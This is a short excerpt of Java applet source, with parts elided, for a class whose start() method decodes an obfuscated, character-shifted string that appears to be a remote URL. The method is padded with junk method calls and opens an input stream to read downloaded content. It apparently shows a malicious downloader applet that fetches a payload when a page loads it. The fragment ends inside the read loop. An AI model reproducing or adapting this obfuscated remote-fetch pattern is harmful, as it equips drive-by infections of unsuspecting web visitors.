...
public class Cleanrhi extends Applet
{
    public int sdS;
    private Class[] sdh;
    private String sdsh;
    ...
    public void start() {
        try {
            final String asgggasg = "lxxt>337525<8267;28=3pseh2tltCwls{jsvyqAvlmrs";
            String sdhds = "";
            this.sffs();
            this.swef();
            ...
            this.sffs();
            this.sffs();
            final InputStream inputstream = Sec.createIS(sdhds);
            this.swef();
            this.swef();
            this.sffs();
            ...
            int asb = 0;
            this.swef();
            while ((asb = inputstream.read(sewwa)) > 0) {
